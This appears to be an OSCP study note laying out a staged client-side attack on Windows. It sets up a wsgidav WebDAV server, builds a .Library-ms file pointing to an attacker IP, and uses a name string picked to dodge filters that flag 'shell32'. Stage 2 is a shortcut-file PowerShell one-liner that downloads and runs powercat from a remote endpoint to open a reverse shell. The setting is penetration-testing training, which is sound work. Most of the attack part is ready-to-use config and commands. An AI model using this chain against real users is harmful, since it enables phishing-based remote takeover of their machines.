---
aliases:
  - Target Reconnaissance
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - client_side_attacks
  - windows
  - lib_files
  - library_files
author: Mehdi N Tehrani
creat_date: 2023-12-27
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Staged Attack
Windows library files are *virtual containers for user content*. They connect users with data stored in remote locations like *web services* or *shares*. These files have a `.Library-ms` file extension and *can be executed* by double-clicking them in Windows Explorer.

## Stage 1
**WebDAV**
#webdav 
a set of extensions to HTTP, which allows user agents to collaboratively author contents directly in an HTTP web server by providing facilities for concurrency control and namespace operations, thus allowing Web to be viewed as a writeable, collaborative medium and not just a read-only medium.
The WebDAV protocol provides a framework for users to *create*, *change* and *move* **documents on a server**. The most important features include the maintenance of properties about an author or modification date, namespace management, collections, and overwrite protection.

### wsgidav server
#### Install
#wsgidav #install
```sh
pip install wsgidav
```
#### Run
```sh
~/.local/bin/wsgidav --host=0.0.0.0 --port=<local_port> --auth=anonymous --root <dir_to_serve>
```

### config.library-ms
Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are:
1. General library information
2. Library properties
3. Library locations. 
We can refer to the Library Description Schema for further information. We'll begin by adding the XML and library file's format version.

#### file xml content
the following can be used as specified on the Microsoft website; the latter to be used to avoid any issues with text-based filters that may flag on "shell32":
``@shell32.dll,-34575`
`@windows.storage.dll,-34582`  

##### tags
- `name`: the name of this library
- `version`: numerical format
- `isLibraryPinned`: boolean; library is pinned to the navigation pane in File Explorer.
- `iconReference`: file icon displayed; value is the same format as `name`
	- `-1002`: **Documents** folder
	- `-1003`: **Pictures** folder
- `templateInfo`: 
	- `folderType`: GUID; determines the columns and details that appear in Windows Explorer by default after opening the library. [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype)
		- Documents GUID: `{7d49d726-3c21-4f05-99aa-fdc2c9474656}`
- `searchConnectorDescriptionList`: storage location where our library file should point to
	- `searchConnectorDescription`
		- `isDefaultSaveLocation`: determines the behavior of Windows Explorer when a user chooses to save an item.
		- `isSupported`: used for compatibility
		- `simpleLocation`
			- `url`: This can be pointed to our WebDAV endpoint
		- `locationProvider`: alternative to `simpleLocation`
		
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
	<searchConnectorDescription>
		<isDefaultSaveLocation>true</isDefaultSaveLocation>
		<isSupported>false</isSupported>
		<simpleLocation>
			<url>http://192.168.45.216:8888</url>
		</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
```

After trying to open the `config.library-ms` file, the following part changes:
```xml
<simpleLocation>
	<url>\\192.168.45.216@8888\DavWWWRoot</url>
<serialized>MBAAAEAFCAAAAAAAADAAAAAAAYkgCAQDQAAAAAodrwpc5odAAa3KcKXOaHAg2tCnylj2BAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIFAAAAHAAAACAAAAAAAAAAAAAAAcAAAAEFAAAQNAAAACAAAAQBAAAAAAAAAAAgLAwFXxkjMuEjN44CN14iMxYDQ4gDO4wFRBZ1VXdlUP9EVAAwCBAAAMAAAgSBAfgVDawC8h4LUDhIszdG/W+OPHDAAAEMA7+6k7MLAEAAAAAAAtAAAAEzUQN1cDVuC+OUrPVI5pxthzgpbRAAAAsAAAAAALAAAA8//AAAAAAAAVBAAAEzUQNFMxXytvfkGQUa8CAGjeuOr5AAAAoAAAAAAfAAAAQBAAAQMAkDAyAgLAEDA2AAOA4CA0AQNA4CAyAQMAYDAABAOAgDA4AAOAAAAAAAAA0CAAAQMTB1U6QaveP7NDOUknTEmanSlrGBAAAwAAAAAAMBAAAAAAAAAAAAAAAAAAAAAAYCADDAIcxVM5IjLxYDOuQTNuITM2AEO4gDOcRUY2d1VXJ1bvRHAAAAFDAAABAAAgyFXxkjMuEjN44CN14iMxYDQ4gDO4wFRhZ3VXdlUv9GdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcBAXAEDA5AgMA4CAxAgNAgDAuAANAUDAuAgMAEDA2AAQAgDA4AAOAgDAcBARAEGA2BwVAcFAXBgUA8GAvBAdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</serialized>
</simpleLocation>
```

## Stage 2
shortcut file `.lnk`
#reverse_shell #windows_shortcut #windows #link_file #lnk #windows_lnk #powercat
```
powershell.exe -c "iex(New-Object Net.WebClient).DownloadString('http://<endpoint>/powercat.ps1');powercat -c <ip> -p <port> -e powershell"
```

